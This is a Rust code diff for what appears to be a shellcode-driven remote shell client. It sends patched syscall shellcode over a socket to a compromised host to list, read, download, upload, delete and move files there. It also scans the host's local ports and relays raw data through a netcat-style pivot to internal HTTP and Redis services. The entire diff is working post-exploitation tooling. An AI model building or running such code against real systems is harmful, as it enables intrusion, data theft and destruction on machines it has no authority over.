@@ -3,7 +3,7 @@ use std::{io::{self, Write, Read}, error::Error, fs::File, path::Path};
 use colored::Colorize;
 use errno::Errno;
 
-use crate::{util::{print_failed, print_success, colorized_file, close_connection, print_error, gen_random_filename}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, REDIS_ESCAPER, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER, UPLOAD_SENDER}};
+use crate::{util::{print_failed, print_success, colorized_file, close_connection, print_error, gen_random_filename, read_bytes_from_file, print_warning}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER, UPLOAD_SENDER, RM_SENDER, MV_SENDER, MKDIR_SENDER, RMDIR_SENDER, NETCAT_ESCAPER, CP_SENDER}};
 
 fn help() {
     println!(
@@ -11,20 +11,30 @@ fn help() {
     Core Commands
     =============
 
-        Command                   Description                                    Syscalls
-        -------                   -------                                        -----------
-        help                      Print This Menu                                N/A
-        ls [DIR]                  List Directory                                 SYS_open, SYS_getdents
-        dir [DIR]                 List Directory                                 SYS_open, SYS_getdents
-        cat [FILE]                Print File Content                             SYS_open, SYS_read
-        cd [DIR]                  Change Directory                               SYS_chdir
-        pwd                       Print Current Directory                        SYS_getcwd
-        getuid                    Get Current UID                                SYS_getuid
-        getgid                    Get Current GID                                SYS_getgid
-        portscan                  Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-        netcat [PORT] [FILE]      Send Data (stored in [FILE]) to Port [PORT]    SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-                                  And receive its output
-        exit                      Exit shell                                     N/A
+        Command                    Description                                    Syscalls
+        -------                    -------                                        -----------
+        help                       Print This Menu                                N/A
+        ls [DIR]                   List Directory                                 SYS_open, SYS_getdents
+        dir [DIR]                  List Directory                                 SYS_open, SYS_getdents
+        cat <FILE>                 Print File Content                             SYS_open, SYS_close
+        cd <DIR>                   Change Directory                               SYS_chdir
+        pwd                        Print Current Directory                        SYS_getcwd
+        download <FILE>            Download File                                  SYS_open, SYS_close
+        upload <FILE> [PERM]       Upload File                                    SYS_open, SYS_close
+        rm <FILE>                  Remove File                                    SYS_unlink
+        mv <SOURCE> <DEST>         Move File                                      SYS_rename
+        cp <SOURCE> <DEST> [PERM]  Copy File                                      SYS_open, SYS_close
+        mkdir <DIR> [PERM]         Create a directory                             SYS_mkdir
+        rmdir <DIR>                Remove a directory                             SYS_rmdir
+        getuid                     Get Current UID                                SYS_getuid
+        getgid                     Get Current GID                                SYS_getgid
+        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+        netcat <INPUT_FILE> <Port> Send Data in the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+                                   and Receive Output
+        http                       HTTP shell                                     SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+        redis                      Redis shell                                    SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+        exit                       Exit shell                                     N/A
+        quit                       Exit shell                                     N/A
 "
     );
 }
@@ -33,10 +43,10 @@ fn dir(config: &Config, directory: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if directory.len() >= 0x10000 {
+    if directory.len() >= 0xffff {
         return Err("dir: file name too long".into());
     }
-    let dir_name_len: u16 = (directory.len() + 1) as u16; // include null byte
+    let dir_name_len = (directory.len() + 1) as u16; // include null byte
     let dir_sender = OPEN_DIR_SENDER;
 
     let mut shellcode = dir_sender.shellcode.to_vec();
@@ -107,10 +117,10 @@ fn cat(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if file_name.len() >= 0x10000 {
+    if file_name.len() >= 0xffff {
         return Err("cat: file name too long".into());
     }
-    let file_name_len: u16 = (file_name.len() + 1) as u16; // include null byte
+    let file_name_len = (file_name.len() + 1) as u16; // include null byte
     let cat_sender = OPEN_CAT_SENDER;
     let mut shellcode = cat_sender.shellcode.to_vec();
     shellcode[cat_sender.file_len_index] = (file_name_len & 0xff) as u8;
@@ -151,10 +161,10 @@ fn cd(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if file.len() >= 0x10000 {
+    if file.len() >= 0xffff {
         return Err("cd: file name too long".into());
     }
-    let file_name_len: u16 = (file.len() + 1) as u16;
+    let file_name_len = (file.len() + 1) as u16;
     let cd_sender = CD_SENDER;
     let mut shellcode = cd_sender.shellcode.to_vec();
     shellcode[cd_sender.file_len_index] = (file_name_len & 0xff) as u8;
@@ -207,55 +217,15 @@ fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
-    if config.conn.is_none() {
-        return Err("Server not connected".into());
-    }
-    let getuid_sender = SYS_GETUID_GETUID_SENDER;
-    let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
-    getuid_shellcode.resize(SHELLCODE_LEN, 0);
-
-
-    let mut conn = config.conn.as_ref().unwrap();
-    conn.write(&getuid_shellcode)?;
-
-    let mut uid_buff = [0; 8];
-    conn.read_exact(&mut uid_buff)?;
-    let uid = i64::from_le_bytes(uid_buff);
-
-    println!("{}", uid);
-
-    Ok(())
-}
-
-fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
-    if config.conn.is_none() {
-        return Err("Server not connected".into());
-    }
-    let getgid_sender = SYS_GETGID_GETGID_SENDER;
-    let mut getgid_shellcode = getgid_sender.shellcode.to_vec();
-    getgid_shellcode.resize(SHELLCODE_LEN, 0);
-
-    let mut conn: &std::net::TcpStream = config.conn.as_ref().unwrap();
-    conn.write(&getgid_shellcode)?;
-
-    let mut gid_buff = [0; 8];
-    conn.read_exact(&mut gid_buff)?;
-    let gid = i64::from_le_bytes(gid_buff);
-
-    println!("{}", gid);
-
-    Ok(())
-}
 
 fn download(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if file_name.len() >= 0x10000 {
+    if file_name.len() >= 0xffff {
         return Err("download: file name too long".into());
     }
-    let file_name_len: u16 = (file_name.len() + 1) as u16; // include null byte
+    let file_name_len = (file_name.len() + 1) as u16; // include null byte
     let download_sender = OPEN_CAT_SENDER; // use cat sender because the shellcode is the same
     let mut shellcode = download_sender.shellcode.to_vec();
     shellcode[download_sender.file_len_index] = (file_name_len & 0xff) as u8;
@@ -301,7 +271,7 @@ fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Err
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if file_name.len() >= 0x10000 {
+    if file_name.len() >= 0xffff {
         return Err("upload: file name too long".into());
     }
 
@@ -318,7 +288,7 @@ fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Err
     let original_file_path = Path::new(file_name);
     let original_file_name = original_file_path.file_name().unwrap_or_default().to_string_lossy();
     let upload_file_name = gen_random_filename(&original_file_name);
-    let upload_file_name_len: u16 = (upload_file_name.len() + 1) as u16;
+    let upload_file_name_len = (upload_file_name.len() + 1) as u16;
 
     let mut file_content_buff = Vec::new();
     original_file.read_to_end(&mut file_content_buff)?;
@@ -353,6 +323,238 @@ fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Err
 
     let message = format!("Upload '{}' to '{}'", file_name, upload_file_name);
     print_success(&message);
+
+    Ok(())
+}
+
+fn rm(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if file_name.len() >= 0xffff {
+        return Err("rm: file name too long".into());
+    }
+    let file_name_len = (file_name.len() + 1) as u16;
+    let rm_sender = RM_SENDER;
+    let mut shellcode = rm_sender.shellcode.to_vec();
+    shellcode[rm_sender.file_len_index] = (file_name_len & 0xff) as u8;
+    shellcode[rm_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(file_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    conn.read_exact(&mut beacon_buff)?;
+    let beacon = i64::from_le_bytes(beacon_buff);
+    if beacon < 0 {
+        let errno = -beacon;
+        let message = format!("rm: cannot access '{}': {}", file_name, Errno(errno as i32));
+        return Err(message.into());
+    }
+
+    let message = format!("File '{}' removed", file_name);
+    print_success(&message);
+
+    Ok(())
+}
+
+pub fn mv(config: &Config, source_file_name: &str, dest_file_name: &str) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if source_file_name.len() >= 0xffff {
+        return Err("mv: source file name too long".into());
+    }
+    if dest_file_name.len() >= 0xffff {
+        return Err("mv: source file name too long".into());
+    }
+
+    let source_file_name_len = (source_file_name.len() + 1) as u16;
+    let dest_file_name_len = (dest_file_name.len() + 1) as u16;
+    let mv_sender = MV_SENDER;
+    let mut shellcode = mv_sender.shellcode.to_vec();
+    shellcode[mv_sender.source_file_len_index] = (source_file_name_len & 0xff) as u8;
+    shellcode[mv_sender.source_file_len_index + 1] = ((source_file_name_len & 0xff00) >> 8) as u8;
+    shellcode[mv_sender.dest_file_len_index] = (dest_file_name_len & 0xff) as u8;
+    shellcode[mv_sender.dest_file_len_index + 1] = ((dest_file_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(source_file_name.as_bytes())?;
+    conn.write(&[0])?;
+    conn.write(dest_file_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    conn.read_exact(&mut beacon_buff)?;
+    let beacon = i64::from_le_bytes(beacon_buff);
+    if beacon < 0 {
+        let errno = -beacon;
+        let message = format!("mv: cannot access '{}' or '{}': {}", source_file_name, dest_file_name, Errno(errno as i32));
+        return Err(message.into());
+    }
+
+    let message = format!("Successfully move '{}' to '{}'", source_file_name, dest_file_name);
+    print_success(&message);
+
+    Ok(())
+}
+
+pub fn cp(config: &Config, source_file_name: &str, dest_file_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if source_file_name.len() >= 0xffff {
+        return Err("cp: source file name too long".into());
+    }
+    if dest_file_name.len() >= 0xffff {
+        return Err("cp: source file name too long".into());
+    }
+
+    let source_file_name_len = (source_file_name.len() + 1) as u16;
+    let dest_file_name_len = (dest_file_name.len() + 1) as u16;
+    let cp_sender = CP_SENDER;
+    let mut shellcode = cp_sender.shellcode.to_vec();
+    shellcode[cp_sender.source_file_len_index] = (source_file_name_len & 0xff) as u8;
+    shellcode[cp_sender.source_file_len_index + 1] = ((source_file_name_len & 0xff00) >> 8) as u8;
+    shellcode[cp_sender.dest_file_len_index] = (dest_file_name_len & 0xff) as u8;
+    shellcode[cp_sender.dest_file_len_index + 1] = ((dest_file_name_len & 0xff00) >> 8) as u8;
+    shellcode[cp_sender.perm_index] = (perm & 0xff) as u8;
+    shellcode[cp_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(source_file_name.as_bytes())?;
+    conn.write(&[0])?;
+    conn.write(dest_file_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    conn.read_exact(&mut beacon_buff)?;
+    let beacon = i64::from_le_bytes(beacon_buff);
+    if beacon < 0 {
+        let errno = -beacon;
+        let message = format!("cp: cannot access '{}' or '{}': {}", source_file_name, dest_file_name, Errno(errno as i32));
+        return Err(message.into());
+    }
+
+    let message = format!("Successfully copy '{}' to '{}'", source_file_name, dest_file_name);
+    print_success(&message);
+    Ok(())
+}
+
+fn mkdir(config: &Config, dir_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if dir_name.len() >= 0xffff {
+        return Err("mkdir: file name too long".into());
+    }
+    let dir_name_len = (dir_name.len() + 1) as u16;
+    let mkdir_sender = MKDIR_SENDER;
+    let mut shellcode = mkdir_sender.shellcode.to_vec();
+    shellcode[mkdir_sender.dir_len_index] = (dir_name_len & 0xff) as u8;
+    shellcode[mkdir_sender.dir_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
+    shellcode[mkdir_sender.perm_index] = (perm & 0xff) as u8;
+    shellcode[mkdir_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(dir_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    conn.read_exact(&mut beacon_buff)?;
+    let beacon = i64::from_le_bytes(beacon_buff);
+    if beacon < 0 {
+        let errno = -beacon;
+        let message = format!("mkdir: cannot access '{}': {}", dir_name, Errno(errno as i32));
+        return Err(message.into());
+    }
+
+    let message = format!("Directory '{}' created", dir_name);
+    print_success(&message);
+
+    Ok(())
+}
+
+fn rmdir(config: &Config, dir_name: &str) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if dir_name.len() >= 0xffff {
+        return Err("rmdir: file name too long".into());
+    }
+    let dir_name_len = (dir_name.len() + 1) as u16;
+    let rmdir_sender = RMDIR_SENDER;
+    let mut shellcode = rmdir_sender.shellcode.to_vec();
+    shellcode[rmdir_sender.file_len_index] = (dir_name_len & 0xff) as u8;
+    shellcode[rmdir_sender.file_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(dir_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    conn.read_exact(&mut beacon_buff)?;
+    let beacon = i64::from_le_bytes(beacon_buff);
+    if beacon < 0 {
+        let errno = -beacon;
+        let message = format!("rmdir: cannot access '{}': {}", dir_name, Errno(errno as i32));
+        return Err(message.into());
+    }
+
+    let message = format!("Directory '{}' removed", dir_name);
+    print_success(&message);
+
+    Ok(())
+}
+
+fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    let getuid_sender = SYS_GETUID_GETUID_SENDER;
+    let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
+    getuid_shellcode.resize(SHELLCODE_LEN, 0);
+
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&getuid_shellcode)?;
+
+    let mut uid_buff = [0; 8];
+    conn.read_exact(&mut uid_buff)?;
+    let uid = i64::from_le_bytes(uid_buff);
+
+    println!("{}", uid);
+
+    Ok(())
+}
+
+fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    let getgid_sender = SYS_GETGID_GETGID_SENDER;
+    let mut getgid_shellcode = getgid_sender.shellcode.to_vec();
+    getgid_shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn: &std::net::TcpStream = config.conn.as_ref().unwrap();
+    conn.write(&getgid_shellcode)?;
+
+    let mut gid_buff = [0; 8];
+    conn.read_exact(&mut gid_buff)?;
+    let gid = i64::from_le_bytes(gid_buff);
+
+    println!("{}", gid);
 
     Ok(())
 }
@@ -409,12 +611,149 @@ pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+fn netcat(config: &Config, payload: &[u8], port: u16, quiet: bool) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+
+    let payload_len = payload.len();
+    let upload_escaper = NETCAT_ESCAPER;
+    let mut shellcode = upload_escaper.shellcode.to_vec();
+    shellcode[upload_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
+    shellcode[upload_escaper.port_index + 1] = (port & 0xff) as u8;
+    shellcode[upload_escaper.payload_length_index0] = (payload_len & 0xff) as u8;
+    shellcode[upload_escaper.payload_length_index0 + 1] = ((payload_len & 0xff00) >> 8) as u8;
+    shellcode[upload_escaper.payload_length_index0 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
+    shellcode[upload_escaper.payload_length_index0 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+    shellcode[upload_escaper.payload_length_index1] = (payload_len & 0xff) as u8;
+    shellcode[upload_escaper.payload_length_index1 + 1] = ((payload_len & 0xff00) >> 8) as u8;
+    shellcode[upload_escaper.payload_length_index1 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
+    shellcode[upload_escaper.payload_length_index1 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(&payload)?;
+
+    let mut beacon_buff = [0; 8];
+    let mut content_buff = Vec::new();
+    loop {
+        conn.read_exact(&mut beacon_buff)?;
+        let beacon = i64::from_le_bytes(beacon_buff);
+        if beacon == 0 {
+            break;
+        }
+        if beacon < 0 {
+            let errno = -beacon;
+            let message = format!("netcat: unexpected error: {}", Errno(errno as i32));
+            return Err(message.into());
+        }
+        let chunk_len = beacon as u64;
+        let mut chunk_buff = vec![0; chunk_len as usize];
+        conn.read_exact(&mut chunk_buff)?;
+        content_buff.extend(chunk_buff);
+    }
+
+    if !quiet {
+        let file_content = String::from_utf8_lossy(&content_buff).to_string();
+        println!("{}", file_content);
+    }
+
+    Ok(())
+}
+
+fn http_help() {
+    println!("
+    Usage: <HTTP_METHOD> <HTTP_PATH> [<HTTP_QUERY>|<POST_DATA>] | exit | quit
+    Examples:
+        GET index.html
+        GET index.php q=1&p=home
+        POST index.php id=johndoe&role=admin
+        exit
+    ");
+}
+
+pub fn http(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
+    let ps = "http> ".bold();
+
+    let stdin = io::stdin();
+    let stdout = io::stdout();
+    let mut stdout_handle = stdout.lock();
+
+    print_warning("This module is used to send simple HTTP requests");
+    print_warning("If you want to send complex HTTP requests, consider using the 'netcat' command");
+
+    loop {
+        let mut line = String::new();
+
+        write!(stdout_handle, "{}", ps)?;
+        stdout_handle.flush()?;
+
+        let bytes_read = stdin.read_line(&mut line)?;
+        if bytes_read == 0 {
+            break;
+        }
+
+        let mut iter = line.trim().split_whitespace();
+        if let Some(method) = iter.next() {
+            match method {
+                "help" => {
+                    http_help();
+                    continue;
+                },
+                "exit" | "quit" => {
+                    break;
+                },
+                "GET" | "POST" => {
+                    if let Some(http_path) = iter.next() {
+                        let query = match iter.next() {
+                            Some(query) => {
+                                query
+                            },
+                            None => {
+                                ""
+                            }
+                        };
+                        let http_request_str = if method == "GET" {
+                            if query.is_empty() {
+                                format!("GET /{} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", http_path)
+                            } else {
+                                format!("GET /{}?{} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", http_path, query)
+                            }
+                        } else {
+                            format!("POST /{} HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}\r\n\r\n", http_path, query.len(), query)
+                        };
+                        println!("{}", http_request_str);
+                        let http_request = http_request_str.as_bytes();
+                        netcat(config, &http_request, port, false)?;
+                    } else {
+                        print_failed("Error: no path specified");
+                    }
+                },
+                _ => {
+                    let message = format!("Error: unsupported method {}", method);
+                    print_failed(&message);
+                    print_warning("If you want to send complex HTTP requests, consider using the 'netcat' command");
+                    http_help();
+                    continue
+                }
+            };
+        }
+    }
+
+    println!("");
+    Ok(())
+}
+
 pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
     let ps = "redis> ".bold();
 
     let stdin = io::stdin();
     let stdout = io::stdout();
     let mut stdout_handle = stdout.lock();
+
+    let set_timeout = "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$7\r\ntimeout\r\n$1\r\n1\r\n".as_bytes();
+    netcat(config, &set_timeout, port, true)?;   
 
     loop {
         let mut line = String::new();
@@ -431,65 +770,23 @@ pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
             break;
         }
 
-        let mut payload = String::new();
-        payload.push('*');
+        let mut payload_str = String::new();
+        payload_str.push('*');
         let cmds_len_str = cmds.len().to_string();
-        payload.push_str(&cmds_len_str);
-        payload.push_str("\r\n");
+        payload_str.push_str(&cmds_len_str);
+        payload_str.push_str("\r\n");
         for cmd in cmds {
-            payload.push('$');
+            payload_str.push('$');
             let cmd_len_str = cmd.len().to_string();
-            payload.push_str(&cmd_len_str);
-            payload.push_str("\r\n");
-            payload.push_str(cmd);
-            payload.push_str("\r\n");
+            payload_str.push_str(&cmd_len_str);
+            payload_str.push_str("\r\n");
+            payload_str.push_str(cmd);
+            payload_str.push_str("\r\n");
         }
 
-        let payload_len = payload.len();
-
-        let redis_escaper = REDIS_ESCAPER;
-        let mut redis_escaper_shellcode = redis_escaper.shellcode.to_vec();
-        redis_escaper_shellcode[redis_escaper.data_length_index0] = (payload_len & 0xff) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index0 + 1] = ((payload_len & 0xff00) >> 8) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index0 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index0 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index1] = (payload_len & 0xff) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index1 + 1] = ((payload_len & 0xff00) >> 8) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index1 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index1 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
-        redis_escaper_shellcode[redis_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
-        redis_escaper_shellcode[redis_escaper.port_index + 1] = (port & 0xff) as u8;
-        redis_escaper_shellcode.resize(SHELLCODE_LEN, 0);
-
-        let mut conn = config.conn.as_ref().unwrap();
-        conn.write(&redis_escaper_shellcode)?;
-        conn.write(payload.as_bytes())?;
-
-        let mut beacon_buff = [0; 8];
-        conn.read_exact(&mut beacon_buff)?;
-        let beacon = i64::from_le_bytes(beacon_buff);
-        if beacon == 0 {
-            println!("OK");
-            continue;
-        }
-        if beacon < 0 {
-            let e = -beacon;
-            let message = format!("redis: {}", Errno(e as i32));
-            return Err(message.into());
-        }
-        let content_len = beacon as u64;
-        let mut content_buff = vec![0; content_len as usize];
-        conn.read_exact(&mut content_buff)?;
-
-        let result;
-        if *content_buff.last().unwrap() == b'\n' {
-            result = String::from_utf8_lossy(&content_buff[1..(content_len - 2) as usize]).to_string();
-        } else {
-            content_buff.reverse();
-            result = String::from_utf8_lossy(&content_buff[..(content_len - 2) as usize]).to_string();
-        }
-
-        println!("{}", result);
+        /* Small hack: set timeout to 1 every time  */
+        let payload = payload_str.as_bytes();
+        netcat(config, &payload, port, false)?;
     }
 
     println!("");
@@ -592,6 +889,87 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                         print_failed("Error: upload: no file specified")
                     }
                 },
+                "rm" => {
+                    if let Some(file_name) = iter.next() {
+                        if let Err(err) = rm(config, file_name) {
+                            print_error(err);
+                        }
+                    } else {
+                        print_failed("Error: rm: no file specified");
+                    }
+                },
+                "mv" => {
+                    if let Some(source_file_name) = iter.next() {
+                        if let Some(dest_file_name) = iter.next() {
+                            if let Err(err) = mv(config, source_file_name, dest_file_name) {
+                                print_error(err);
+                            }
+                        } else {
+                            print_failed("Error: mv: no destination file specified");
+                        }
+                    } else {
+                        print_failed("Error: mv: no source file specified");
+                    }
+                },
+                "cp" => {
+                    if let Some(source_file_name) = iter.next() {
+                        if let Some(dest_file_name) = iter.next() {
+                            let perm_option = match iter.next() {
+                                Some(perm_str) => {
+                                    if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
+                                        Some(perm)
+                                    } else {
+                                        None
+                                    }
+                                },
+                                None => { Some(0o644) },
+                            };
+                            if let Some(perm) = perm_option {
+                                if let Err(err) = cp(config, source_file_name, dest_file_name, perm) {
+                                    print_error(err);
+                                }
+                            } else {
+                                print_failed("Error: upload: invalid permission")
+                            }
+                        } else {
+                            print_failed("Error: cp: no destination file specified");
+                        }
+                    } else {
+                        print_failed("Error: cp: no source file specified");
+                    }
+                },
+                "mkdir" => {
+                    if let Some(file_name) = iter.next() {
+                        let perm_option = match iter.next() {
+                            Some(perm_str) => {
+                                if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
+                                    Some(perm)
+                                } else {
+                                    None
+                                }
+                            },
+                            None => { Some(0o755) },
+                        };
+                        if let Some(perm) = perm_option {
+                            if let Err(err) = mkdir(config, file_name, perm) {
+                                print_error(err);
+                            }
+                        } else {
+                            print_failed("Error: mkdir: invalid permission")
+                        }
+                    } else {
+                        print_failed("Error: mkdir: no file specified");
+                    }
+                },
+                "rmdir" => {
+                    if let Some(file_name) = iter.next() {
+                        if let Err(err) = rmdir(config, file_name) {
+                            print_error(err);
+                        }
+                    } else {
+                        print_failed("Error: rmdir: no file specified");
+                    }
+                },
                 "getuid" => {
                     if let Err(err) = getuid(config) {
                         print_error(err);
@@ -605,6 +983,31 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                 "portscan" => {
                     if let Err(err) = portscan(config) {
                         print_error(err);
+                    }
+                },
+                "netcat" => {
+                    if let Some(file_name) = iter.next() {
+                        match read_bytes_from_file(file_name) {
+                            Ok(data) => {
+                                if let Some(port_str) = iter.next() {
+                                    if let Ok(port) = port_str.parse::<u16>() {
+                                        if let Err(err) = netcat(config, &data, port, false) {
+                                            print_error(err);
+                                        }
+                                    } else {
+                                        let message = format!("Error: netcat: invalid port {}", port_str);
+                                        print_failed(&message);
+                                    }
+                                } else {
+                                    print_failed("Error: netcat: no port specified");
+                                }
+                            },
+                            Err(err) => {
+                                print_error(err);
+                            }
+                        }
+                    } else {
+                        print_failed("Error: netcat: no input file specified");
                     }
                 },
                 "redis" => {
@@ -624,7 +1027,24 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                         print_error(err);
                     }
                 },
-                "exit" => {
+                "http" => {
+                    let port = match iter.next() {
+                        Some(port_str) => {
+                            if let Ok(port) = port_str.parse::<u16>() {
+                                port
+                            } else {
+                                80
+                            }
+                        },
+                        None => {
+                            80
+                        }
+                    };
+                    if let Err(err) = http(config, port) {
+                        print_error(err);
+                    }
+                },
+                "exit" | "quit" => {
                     if let Ok(want_exit) = exit() {
                         if want_exit {
                             close_connection(config);
